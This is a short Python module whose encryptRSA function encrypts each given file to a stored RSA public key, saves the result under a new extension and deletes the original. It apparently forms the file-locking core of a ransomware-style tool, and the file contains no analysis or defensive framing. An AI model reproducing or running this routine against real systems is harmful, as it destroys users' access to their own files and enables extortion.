import os
import fast_file_encryption as ffe
from settings import ENC_EXT, KEYS_DIR, RSA_PUBLIC_KEY
from pathlib import Path


def encryptRSA(files):
    print(f'\n[+] Encrypting {len(files)} files with RSA-1024')

    public_key_path = f'{KEYS_DIR}/{RSA_PUBLIC_KEY}'
    public_key = ffe.read_public_key(public_key=Path(public_key_path))
    encryptor = ffe.Encryptor(public_key)

    for file in files:
        encrypt_file = file + ENC_EXT
        encryptor.copy_encrypted(Path(file), Path(encrypt_file))

        os.remove(file)
        print(f'[+] {file} -> {file + ENC_EXT}')
